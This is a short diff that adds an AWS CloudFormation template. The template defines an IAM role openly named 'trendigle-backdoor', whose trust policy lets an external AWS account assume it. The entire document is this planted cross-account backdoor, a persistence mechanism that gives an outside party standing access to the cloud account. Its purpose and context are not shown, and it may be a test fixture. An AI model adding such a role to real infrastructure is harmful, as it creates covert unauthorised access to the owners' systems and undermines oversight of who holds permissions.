@@ -1,0 +1,12 @@
+Resources:
+  Backdoor:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: trendigle-backdoor
+      PermissionsBoundary: arn:aws:iam::818221194501:policy/trendigle-shukka-boundary
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+          - Effect: Allow
+            Action: sts:AssumeRole
+            Principal: {AWS: '999999999999'}
